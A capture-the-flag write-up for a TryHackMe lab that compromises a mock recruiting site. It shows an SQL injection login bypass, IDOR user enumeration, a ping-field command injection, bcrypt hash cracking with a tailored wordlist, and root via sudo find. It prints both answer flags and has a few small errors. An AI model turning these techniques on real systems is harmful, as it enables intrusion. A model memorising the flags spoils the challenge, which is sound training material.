# [TryHackMe | Operation Promotion](https://tryhackme.com/room/operationpromotion) Challenge Room Solution Writeup

### What is the content of user.txt?

Begin by scanning `TARGET_IP` with `nmap`.

```bash
root@ip-ATTACKER_IP:~# nmap -sV -sC -p- TARGET_IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 
Nmap scan report for ip-TARGET_IP.ec2.internal (TARGET_IP)
Host is up (0.00032s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8d:33:de:b6:13:31:dc:a4:47:c6:2a:53:57:d2:07:6b (ECDSA)
|_  256 53:8f:d4:40:2a:c6:d0:21:27:c2:c9:68:ff:05:7c:66 (ED25519)
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
|_http-title: RecruitCorp - Careers Portal
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin/
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 
|_  start_date: N/A
|_clock-skew: -1s
|_nbstat: NetBIOS name: RECRUITCORP, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds
```

There is an open `SMB` server, attempt to list the shares via a null (or Guest) session.

```bash
root@ip-ATTACKER_IP:~# smbclient -L //TARGET_IP -N

	Sharename       Type      Comment
	---------       ----      -------
	public          Disk      
	IPC$            IPC       IPC Service (RecruitCorp File Services)
SMB1 disabled -- no workgroup available
```

Attempt to access the `public` share, then find and get available files. Unfortunately this appears to be a dead-end.

```bash
root@ip-ATTACKER_IP:~# smbclient //TARGET_IP/public -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May  9 22:40:25 2026
  ..                                  D        0  Sat May  9 22:40:25 2026
  README.txt                          N       92  Sat May  9 22:40:25 2026

		40581564 blocks of size 1024. 36339040 blocks available
smb: \> get README.txt 
getting file \README.txt of size 92 as README.txt (29.9 KiloBytes/sec) (average 29.9 KiloBytes/sec)
smb: \> exit
root@ip-ATTACKER_IP:~# cat README.txt 
This share is reserved for future internal file distribution.
Nothing to see here yet.
- IT
```

Use `gobuster` to map out the directory structure of the `TARGET_IP` website. 

```yaml
root@ip-ATTACKER_IP:~# gobuster dir --url http://TARGET_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -r -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET_IP/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 1620]
/admin                (Status: 200) [Size: 1093]
/config               (Status: 403) [Size: 278]
/robots.txt           (Status: 200) [Size: 32]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 278]
Progress: 5095332 / 5095336 (100.00%)
===============================================================
Finished
===============================================================
```

Inspect `/index.php` to discover an email (`careers@recruitcorp.thm`) from which `username=careers` and `domain=recruitcorp.thm` are derived.

```html
root@ip-ATTACKER_IP:~# curl -X GET http://TARGET_IP/index.php 
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>RecruitCorp - Careers Portal</title>
<link rel="stylesheet" href="/style.css">
</head>
<body>
<nav class="navbar">
    <span class="brand">RecruitCorp</span>
</nav>
<main class="container">
    <div class="card">
        <h1>Connecting talent with opportunity since 2019</h1>
        <p class="muted">Trusted by 200+ companies across tech, finance, and healthcare.</p>
    </div>

    <div class="card">
        <h2>Spring 2026 Hiring Drive</h2>
        <p>Our spring intake is now open. RecruitCorp is placing senior engineers,
        product managers, and customer success leads with high-growth startups across
        EMEA, AMER, and APAC. Talk to one of our recruiters this season to find your
        next role.</p>
    </div>

    <div class="card">
        <h2>Open Roles</h2>
        <ul class="list">
            <li>Senior Backend Engineer (Remote)</li>
            <li>Customer Success Lead (NYC)</li>
            <li>Recruiter, Tech (London)</li>
            <li>Product Manager, Platform (Berlin)</li>
        </ul>
    </div>

    <div class="card">
        <h2>News</h2>
        <p>RecruitCorp is opening a new office in Singapore. Our summer cohort is
        already being shortlisted, with the autumn intake focused on AI and machine
        learning roles.</p>
    </div>

    <div class="card">
        <p>Apply via our portal or get in touch at careers@recruitcorp.thm.</p>
    </div>
</main>
<footer class="site">&copy; RecruitCorp</footer>
</body>
</html>
```

Update `/etc/hosts`.

```bash
root@ip-ATTACKER_IP:~# echo 'TARGET_IP recruitcorp.thm' >> /etc/hosts
```

Inspect `/robots.txt` to discover nothing new.

```bash
root@ip-ATTACKER_IP:~# curl -X GET http://recruitcorp.thm/robots.txt
User-agent: *
Disallow: /admin/
```

Inspect `/admin/` to discover a login page.

```html
root@ip-ATTACKER_IP:~# curl -X GET http://recruitcorp.thm/admin/
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in - RecruitCorp Admin</title>
<link rel="stylesheet" href="/style.css">
</head>
<body>
<nav class="navbar">
    <span class="brand">RecruitCorp Admin</span>
</nav>
<main class="container" style="max-width:420px">
    <div class="card">
        <h1>Sign in</h1>
        <p class="muted">Internal admin portal. Authorised personnel only.</p>
                <form method="POST" action="/admin/">
            <div class="form-group">
                <label for="username">Username</label>
                <input id="username" type="text" name="username" class="form-control" required autofocus>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input id="password" type="password" name="password" class="form-control" required>
            </div>
            <button type="submit" class="btn btn-primary">Sign in</button>
        </form>
    </div>
</main>
</body>
</html>
```

There is no immediately apparent vulnerability to exploit. Perhaps the login page is vulnerable to Search Query Language inejction (SQLi).

```html
root@ip-ATTACKER_IP:~# curl -c cookies.txt -iX POST http://recruitcorp.thm/admin/ --data-urlencode "username=' OR 1=1;-- -" --data-urlencode 'password=password'
HTTP/1.1 302 Found
Date: 
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=ekqc2ugb0t1m2oje71unf2nq40; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /admin/dashboard.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Inspect `/admin/dashboard.php` with the saved session cookie to discover  an ID-based lookup form, which exposes a potential IDOR vulnerability. The SQLi login bypass authenticated the session as `username=admin`.

```html
root@ip-ATTACKER_IP:~# curl -b cookies.txt -X GET http://recruitcorp.thm/admin/dashboard.php
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Dashboard - RecruitCorp Admin</title>
<link rel="stylesheet" href="/style.css">
</head>
<body>
<nav class="navbar">
    <span class="brand">RecruitCorp Admin</span>
    <span>admin &middot; <a href="/admin/logout.php">Sign out</a></span>
</nav>
<main class="container">
    <div class="card">
        <h1>Welcome back</h1>
        <p class="muted">RecruitCorp internal admin console.</p>
    </div>

    <div class="card">
        <h2>User Lookup</h2>
        <p class="muted">Look up a user record by ID.</p>
        <form method="GET" action="/admin/users/lookup.php" class="row-inline">
            <div class="form-group">
                <label for="id">User ID</label>
                <input id="id" type="number" name="id" class="form-control" min="1" required>
            </div>
            <button type="submit" class="btn btn-primary">Look up</button>
        </form>
    </div>

    <div class="card">
        <h2>Quick Links</h2>
        <ul class="list">
            <li><a href="/admin/users/lookup.php?id=1">View own profile</a></li>
            <li><a href="/admin/logout.php">Sign out</a></li>
        </ul>
    </div>
</main>
</body>
</html>
```

Having discovered a potential IDOR vulnerability in `/admin/users/lookup.php?id=x`, try iterating this variable (`/admin/users/lookup.php` itself exposes nothing of interest).

```html
root@ip-ATTACKER_IP:~# for x in $(seq -1 10); do curl -s -X GET -b cookies.txt "http://recruitcorp.thm/admin/users/lookup.php?id=$x"; echo; done
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>User Lookup - RecruitCorp Admin</title>
<link rel="stylesheet" href="/style.css">
</head>
<body>
<nav class="navbar">
    <span class="brand">RecruitCorp Admin</span>
    <span>admin &middot; <a href="/admin/logout.php">Sign out</a></span>
</nav>
<main class="container">
    <div class="card">
        <p><a href="/admin/dashboard.php">&larr; Back to dashboard</a></p>
        <h1>User Lookup</h1>
                    <p class="muted">No user with that ID.</p>
            </div>
</main>
</body>
</html>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>User Lookup - RecruitCorp Admin</title>
<link rel="stylesheet" href="/style.css">
</head>
<body>
<nav class="navbar">
    <span class="brand">RecruitCorp Admin</span>
    <span>admin &middot; <a href="/admin/logout.php">Sign out</a></span>
</nav>
<main class="container">
    <div class="card">
        <p><a href="/admin/dashboard.php">&larr; Back to dashboard</a></p>
        <h1>User Lookup</h1>
                    <p class="muted">No user with that ID.</p>
            </div>
</main>
</body>
</html>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>User Lookup - RecruitCorp Admin</title>
<link rel="stylesheet" href="/style.css">
</head>
<body>
<nav class="navbar">
    <span class="brand">RecruitCorp Admin</span>
    <span>admin &middot; <a href="/admin/logout.php">Sign out</a></span>
</nav>
<main class="container">
    <div class="card">
        <p><a href="/admin/dashboard.php">&larr; Back to dashboard</a></p>
        <h1>User Lookup</h1>
                    <table>
                <tr><th>ID</th><td>1</td></tr>
                <tr><th>Username</th><td>admin</td></tr>
                <tr><th>Role</th><td>admin</td></tr>
                <tr><th>Notes</th><td>Primary admin account.</td></tr>
            </table>
            </div>
</main>
</body>
</html>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>User Lookup - RecruitCorp Admin</title>
<link rel="stylesheet" href="/style.css">
</head>
<body>
<nav class="navbar">
    <span class="brand">RecruitCorp Admin</span>
    <span>admin &middot; <a href="/admin/logout.php">Sign out</a></span>
</nav>
<main class="container">
    <div class="card">
        <p><a href="/admin/dashboard.php">&larr; Back to dashboard</a></p>
        <h1>User Lookup</h1>
                    <table>
                <tr><th>ID</th><td>2</td></tr>
                <tr><th>Username</th><td>mvasquez</td></tr>
                <tr><th>Role</th><td>recruiter</td></tr>
                <tr><th>Notes</th><td>Owns the EMEA pipeline.</td></tr>
            </table>
            </div>
</main>
</body>
</html>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>User Lookup - RecruitCorp Admin</title>
<link rel="stylesheet" href="/style.css">
</head>
<body>
<nav class="navbar">
    <span class="brand">RecruitCorp Admin</span>
    <span>admin &middot; <a href="/admin/logout.php">Sign out</a></span>
</nav>
<main class="container">
    <div class="card">
        <p><a href="/admin/dashboard.php">&larr; Back to dashboard</a></p>
        <h1>User Lookup</h1>
                    <table>
                <tr><th>ID</th><td>3</td></tr>
                <tr><th>Username</th><td>tparker</td></tr>
                <tr><th>Role</th><td>recruiter</td></tr>
                <tr><th>Notes</th><td>Owns the AMER pipeline.</td></tr>
            </table>
            </div>
</main>
</body>
</html>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>User Lookup - RecruitCorp Admin</title>
<link rel="stylesheet" href="/style.css">
</head>
<body>
<nav class="navbar">
    <span class="brand">RecruitCorp Admin</span>
    <span>admin &middot; <a href="/admin/logout.php">Sign out</a></span>
</nav>
<main class="container">
    <div class="card">
        <p><a href="/admin/dashboard.php">&larr; Back to dashboard</a></p>
        <h1>User Lookup</h1>
                    <table>
                <tr><th>ID</th><td>4</td></tr>
                <tr><th>Username</th><td>lhayes</td></tr>
                <tr><th>Role</th><td>analyst</td></tr>
                <tr><th>Notes</th><td>Reporting only.</td></tr>
            </table>
            </div>
</main>
</body>
</html>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>User Lookup - RecruitCorp Admin</title>
<link rel="stylesheet" href="/style.css">
</head>
<body>
<nav class="navbar">
    <span class="brand">RecruitCorp Admin</span>
    <span>admin &middot; <a href="/admin/logout.php">Sign out</a></span>
</nav>
<main class="container">
    <div class="card">
        <p><a href="/admin/dashboard.php">&larr; Back to dashboard</a></p>
        <h1>User Lookup</h1>
                    <table>
                <tr><th>ID</th><td>5</td></tr>
                <tr><th>Username</th><td>kchen</td></tr>
                <tr><th>Role</th><td>recruiter</td></tr>
                <tr><th>Notes</th><td>Out on leave.</td></tr>
            </table>
            </div>
</main>
</body>
</html>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>User Lookup - RecruitCorp Admin</title>
<link rel="stylesheet" href="/style.css">
</head>
<body>
<nav class="navbar">
    <span class="brand">RecruitCorp Admin</span>
    <span>admin &middot; <a href="/admin/logout.php">Sign out</a></span>
</nav>
<main class="container">
    <div class="card">
        <p><a href="/admin/dashboard.php">&larr; Back to dashboard</a></p>
        <h1>User Lookup</h1>
                    <table>
                <tr><th>ID</th><td>6</td></tr>
                <tr><th>Username</th><td>rdavis</td></tr>
                <tr><th>Role</th><td>analyst</td></tr>
                <tr><th>Notes</th><td>Reporting only.</td></tr>
            </table>
            </div>
</main>
</body>
</html>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>User Lookup - RecruitCorp Admin</title>
<link rel="stylesheet" href="/style.css">
</head>
<body>
<nav class="navbar">
    <span class="brand">RecruitCorp Admin</span>
    <span>admin &middot; <a href="/admin/logout.php">Sign out</a></span>
</nav>
<main class="container">
    <div class="card">
        <p><a href="/admin/dashboard.php">&larr; Back to dashboard</a></p>
        <h1>User Lookup</h1>
                    <table>
                <tr><th>ID</th><td>7</td></tr>
                <tr><th>Username</th><td>sysmaint</td></tr>
                <tr><th>Role</th><td>system</td></tr>
                <tr><th>Notes</th><td>Service account for /admin/sysmaint-checks/ping.php. Do not disable.</td></tr>
            </table>
            </div>
</main>
</body>
</html>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>User Lookup - RecruitCorp Admin</title>
<link rel="stylesheet" href="/style.css">
</head>
<body>
<nav class="navbar">
    <span class="brand">RecruitCorp Admin</span>
    <span>admin &middot; <a href="/admin/logout.php">Sign out</a></span>
</nav>
<main class="container">
    <div class="card">
        <p><a href="/admin/dashboard.php">&larr; Back to dashboard</a></p>
        <h1>User Lookup</h1>
                    <table>
                <tr><th>ID</th><td>8</td></tr>
                <tr><th>Username</th><td>jbailey</td></tr>
                <tr><th>Role</th><td>recruiter</td></tr>
                <tr><th>Notes</th><td>New starter Q3.</td></tr>
            </table>
            </div>
</main>
</body>
</html>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>User Lookup - RecruitCorp Admin</title>
<link rel="stylesheet" href="/style.css">
</head>
<body>
<nav class="navbar">
    <span class="brand">RecruitCorp Admin</span>
    <span>admin &middot; <a href="/admin/logout.php">Sign out</a></span>
</nav>
<main class="container">
    <div class="card">
        <p><a href="/admin/dashboard.php">&larr; Back to dashboard</a></p>
        <h1>User Lookup</h1>
                    <table>
                <tr><th>ID</th><td>9</td></tr>
                <tr><th>Username</th><td>aokafor</td></tr>
                <tr><th>Role</th><td>recruiter</td></tr>
                <tr><th>Notes</th><td>APAC.</td></tr>
            </table>
            </div>
</main>
</body>
</html>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>User Lookup - RecruitCorp Admin</title>
<link rel="stylesheet" href="/style.css">
</head>
<body>
<nav class="navbar">
    <span class="brand">RecruitCorp Admin</span>
    <span>admin &middot; <a href="/admin/logout.php">Sign out</a></span>
</nav>
<main class="container">
    <div class="card">
        <p><a href="/admin/dashboard.php">&larr; Back to dashboard</a></p>
        <h1>User Lookup</h1>
                    <p class="muted">No user with that ID.</p>
            </div>
</main>
</body>
</html>
```

This revealed many new usernames. Append these and the `careers` user from earlier to `emails.txt` and `usernames.txt`. These may become useful later.

```bash
root@ip-ATTACKER_IP:~# printf '%s\n' careers admin mvasquez tparker lhayes kchen rdavis sysmaint jbailey aokafor | tee -a usernames.txt | sort -u -o usernames.txt && sed 's/$/@recruitcorp.thm/' usernames.txt >> emails.txt && sort -u -o emails.txt emails.txt
root@ip-ATTACKER_IP:~# cat emails.txt 
admin@recruitcorp.thm
aokafor@recruitcorp.thm
careers@recruitcorp.thm
jbailey@recruitcorp.thm
kchen@recruitcorp.thm
lhayes@recruitcorp.thm
mvasquez@recruitcorp.thm
rdavis@recruitcorp.thm
sysmaint@recruitcorp.thm
tparker@recruitcorp.thm
root@ip-ATTACKER_IP:~# cat usernames.txt 
admin
aokafor
careers
jbailey
kchen
lhayes
mvasquez
rdavis
sysmaint
tparker
```

Further enumeration revealed that `sysmaint` is a service account associated with `/admin/sysmaint-checks/ping.php`, providing a potential avenue for further investigation. Inspect `/admin/sysmaint-checks/ping.php` to discover another potential IDOR vulnerability.

```bash
root@ip-ATTACKER_IP:~# curl -b cookies.txt -X GET http://recruitcorp.thm/admin/sysmaint-checks/ping.php
Usage: /admin/sysmaint-checks/ping.php?host=<target>
```

Test for a command injection vulnerability against `/admin/sysmaint-checks/ping.php`, using the payload `0.0.0.0%%3Bwhoami`, where `%3B` represents a URL-encoded semicolon character.

```bash
root@ip-ATTACKER_IP:~# curl -b cookies.txt -G http://recruitcorp.thm/admin/sysmaint-checks/ping.php --data-urlencode 'host=0.0.0.0; whoami'
PING 0.0.0.0 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.024 ms

--- 0.0.0.0 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.024/0.024/0.024/0.000 ms
www-data
```

Subsequent commands use this injection format. Discover and read `/config/db.conf` to obtain `username=jford` and their hash.

```bash
www-data:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data:~$ ../../config ls -l
total 4
-rw-r--r-- 1 www-data www-data 234 May  9  2026 db.conf
www-data:~$ cat ../../config/db.conf
# RecruitCorp application database config
# Pulled out of source control - DO NOT COMMIT.
db_host=localhost
db_name=recruitcorp
db_user=jford
db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq
db_engine=sqlite3
root@ip-ATTACKER_IP:~# echo 'jford:$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq' > jford.hash
```

Brute-forcing `bcrypt` hashes with large wordlists such as `rockyou.txt` is computationally expensive and often impractical. Instead, manually review the content of `http://recruitcorp.thm/index.php` to identify relevant keywords, including company names, locations, and other notable terms. Add these to the wordlist, then generate additional password candidates by appending the two years identified during enumeration (`2019` and `2026`) as well as a special character to each entry.

```bash
root@ip-ATTACKER_IP:~# cat > keywords.txt << 'EOF'
recruitcorp
tech
finance
healthcare
spring
summer
autumn
winter
emea
amer
apac
remote
nyc
london
berlin
singapore
EOF
root@ip-ATTACKER_IP:~# awk '{print $0 "2019!"; print $0 "2019@"; print $0 "2019$"; print $0 "2026!"; print $0 "2026@"; print $0 "2026$"}' keywords.txt > wordlist.txt
root@ip-ATTACKER_IP:~# head wordlist.txt 
recruitcorp2019!
recruitcorp2019@
recruitcorp2019$
recruitcorp2026!
recruitcorp2026@
recruitcorp2026$
tech2019!
tech2019@
tech2019$
tech2026!
```

Crack their hash.

```bash
root@ip-ATTACKER_IP:~# john jford.hash --wordlist=wordlist.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Note: Passwords longer than 24 [worst case UTF-8] to 72 [ASCII] truncated (property of the hash)
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
spring2026!      (jford)     
1g 0:00:00:01 DONE () 0.6993g/s 25.17p/s 25.17c/s 25.17C/s healthcare2019!..summer2026$
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Connect to the `SSH` service running on port `22` using `username=jford&password=spring2026!`.

```bash
root@ip-ATTACKER_IP:~# ssh jford@recruitcorp.thm
The authenticity of host 'recruitcorp.thm (10.65.160.196)' can't be established.
ED25519 key fingerprint is SHA256:ShIHCaa4rFt+gABVntKd0kzX1eaMV9QzLVUpqdFAd8Y.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'recruitcorp.thm' (ED25519) to the list of known hosts.
(jford@recruitcorp.thm) Password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.17.0-1015-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of 

  System load:  0.0               Temperature:           -273.1 C
  Usage of /:   7.9% of 38.70GB   Processes:             118
  Memory usage: 19%               Users logged in:       0
  Swap usage:   0%                IPv4 address for ens5: 10.65.160.196

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

jford@recruitcorp:~$ whoami
jford
jford@recruitcorp:~$ id
uid=1001(jford) gid=1001(jford) groups=1001(jford)
jford@recruitcorp:~$ ls -l
total 4
-rw------- 1 jford jford 38 May  9  2026 user.txt
jford@recruitcorp:~$ cat user.txt 
THM{bdbee0a91ebcb0b0fafde931223efe09}
```

The captured flag is **THM{bdbee0a91ebcb0b0fafde931223efe09}**.

### What is the content of flag.txt?

Inspect `jford`'s `sudo` privileges and identify that `/usr/bin/find` can be executed as `root` without requiring a password.

```bash
jford@recruitcorp:~$ sudo -l
Matching Defaults entries for jford on recruitcorp:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jford may run the following commands on recruitcorp:
    (root) NOPASSWD: /usr/bin/find
```

Pass `/bin/bash \;` to `/usr/bin/find` to gain an interactive `root` shell.

```bash
jford@recruitcorp:~$ sudo /usr/bin/find . -exec /bin/bash \; -quit
root@recruitcorp:/home/jford# cd
root@recruitcorp:~# whoami
root
root@recruitcorp:~# id
uid=0(root) gid=0(root) groups=0(root)
root@recruitcorp:~# ls -l
total 8
-rw------- 1 root root   38 May  9  2026 flag.txt
drwxr-xr-x 4 root root 4096 Oct 22  2024 snap
root@recruitcorp:~# cat flag.txt 
THM{d999a1f6319a9c5b48c067dfab314ba2}
```

The captured flag is **THM{d999a1f6319a9c5b48c067dfab314ba2}**.